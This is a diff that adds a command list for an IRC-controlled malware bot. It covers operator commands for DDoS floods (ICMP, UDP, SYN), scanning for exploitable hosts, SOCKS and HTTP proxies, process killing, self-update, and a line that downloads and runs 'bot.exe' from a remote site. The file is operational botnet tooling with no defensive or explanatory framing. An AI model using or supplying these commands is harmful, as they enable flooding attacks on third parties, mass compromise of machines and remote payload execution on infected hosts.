@@ -1,0 +1,38 @@
+!uptime 1
+!netinfo
+!sysinfo
+!scanstop
+!scanstart asn:139 2 !scanstart limewire:(limewireport) 2
+!download http://site.com/bot.exe c:\e.exe -r
+!ID
+!UPTIME [days]
+!SYSINFO
+!NETINFO
+!RECONNECT
+!DIE
+!UNINSTALL [id]
+!OPEN <file>
+!DELETE <file>
+!SPEEDTEST <ftpurl>
+!DOWNLOAD <url> <dir> [-r]
+!UPDATE <url> [id]
+!THRDLIST
+!THRDKILL <name>
+!THRDKILLID <id>
+!THRDKILLALL
+!PSLIST
+!PSKILL <process>
+!PSKILLPID <pid>
+!SOCKS4START <port>
+!SOCKS4STOP
+!HTTPDSTART <port>
+!HTTPDSTOP
+!DDOSICMP <host> <time> [-f]
+!DDOSUDP <host> <port> <time> [-f]
+!DDOSSYN <host> <port> <time> [-f]
+!DDOSSTOP
+!SCANSTART <port|exploit> <speed> [cftpinfo] [-a|-b|-c|range]
+!SCANSTOP
+!SCANSTATS [amount]
+!PSCANSTART <startport> <endport> <speed> <ip>
+!PSCANSTOP
